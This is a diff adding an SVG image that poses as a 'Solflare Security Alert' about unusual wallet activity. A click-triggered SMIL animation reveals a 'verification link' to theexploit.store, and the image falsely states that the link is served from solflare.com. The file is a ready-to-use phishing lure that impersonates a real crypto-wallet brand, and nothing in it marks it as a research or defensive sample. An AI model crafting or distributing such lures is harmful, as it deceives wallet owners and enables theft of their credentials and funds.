@@ -1,0 +1,42 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="500" height="300" xmlns="http://www.w3.org/2000/svg">
+  <style>
+    .step1 { display: inline; }
+    .step1-hide { display: none; }
+    .step2 { display: none; }
+    .step2-show { display: inline; }
+    .url-text { fill: #4fc3f7; font-family: monospace; font-size: 16px; text-decoration: underline; cursor: pointer; }
+    .btn-rect { fill: #ff6b35; rx: 8; cursor: pointer; }
+    .title { fill: #ffffff; font-family: sans-serif; font-size: 20px; font-weight: bold; }
+    .body { fill: #a8b2d8; font-family: sans-serif; font-size: 13px; }
+    .bg { fill: #1a1a2e; }
+  </style>
+
+  <rect class="bg" width="500" height="300"/>
+  
+  <!-- Step 1: Initial alert -->
+  <g id="step1" class="step1">
+    <text fill="#ff6b35" font-size="26" x="250" y="80" text-anchor="middle">⚠</text>
+    <text class="title" x="250" y="120" text-anchor="middle">Solflare Security Alert</text>
+    <text class="body" x="250" y="155" text-anchor="middle">Unusual activity detected on your wallet.</text>
+    <text class="body" x="250" y="175" text-anchor="middle">Click below to reveal verification link.</text>
+    
+    <!-- SMIL: click anywhere on step1 group to reveal step2 -->
+    <set href="#step1" attributeName="class" to="step1-hide" begin="revbtn.click" fill="freeze"/>
+    <set href="#step2" attributeName="class" to="step2-show" begin="revbtn.click" fill="freeze"/>
+    
+    <!-- Clickable button -->
+    <g id="revbtn">
+      <rect x="150" y="200" width="200" height="45" fill="#ff6b35" rx="8" cursor="pointer"/>
+      <text x="250" y="229" text-anchor="middle" fill="white" font-size="15" font-weight="bold" cursor="pointer">Reveal Secure Link</text>
+    </g>
+  </g>
+
+  <!-- Step 2: URL revealed (initially hidden) -->
+  <g id="step2" class="step2">
+    <text class="title" x="250" y="100" text-anchor="middle">Your verification link:</text>
+    <text class="url-text" x="250" y="160" text-anchor="middle">theexploit.store/verify</text>
+    <text class="body" x="250" y="200" text-anchor="middle">Tap the URL above or type it in your browser.</text>
+    <text class="body" x="250" y="225" text-anchor="middle">Served securely from: www.solflare.com</text>
+  </g>
+</svg>
